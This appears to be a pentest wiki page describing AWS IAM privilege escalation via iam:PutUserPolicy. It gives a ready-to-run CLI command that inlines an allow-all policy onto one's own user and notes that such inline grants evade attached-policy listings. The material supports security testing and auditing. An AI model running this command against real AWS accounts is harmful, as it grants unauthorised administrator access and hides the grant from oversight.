---
title: "PutUserPolicy: inline an allow-all policy onto your user"
description: "iam:PutUserPolicy to inline an allow-all policy directly onto a user you control."
keywords:
  - PutUserPolicy
  - inline policy
  - user
  - allow-all
  - policy
---

# PutUserPolicy

`iam:PutUserPolicy` writes an **inline** policy directly onto a user, no managed policy involved. Inline an allow-all statement onto your own user and you are administrator, with the grant living on the user rather than as a separate attachable object.

## Inline admin

```bash
aws iam put-user-policy --user-name <you> --policy-name esc \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

## Exploitation notes

- Inline policies do not show up in `list-attached-user-policies`; they are read with `list-user-policies` and `get-user-policy`.
- This needs only `iam:PutUserPolicy`, no policy-creation permission.

## Tools

- **AWS CLI** (`iam put-user-policy`).
- **Pacu** (`iam__privesc_scan`).

## References

- [Rhino Security Labs: AWS privilege escalation (PutUserPolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
